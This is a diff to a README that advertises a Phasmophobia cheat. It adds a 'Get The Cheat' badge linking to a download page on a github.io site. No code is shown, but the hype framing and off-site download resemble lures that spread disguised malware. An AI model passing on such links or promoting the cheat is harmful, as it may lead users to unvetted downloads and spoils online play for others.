@@ -4,7 +4,7 @@ Sick of random ghost hunts ending in jump scares and rage quits? Want to walk in
 
 Whether you're hunting like a pro or just wanna mess with your friends, these cheats flip the script from survival horror to horror simulator *you* control.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://phasmophobia-cheat.github.io/.github/)
 ---
 
 ## 👻 What’s in the Phasmophobia Cheat?
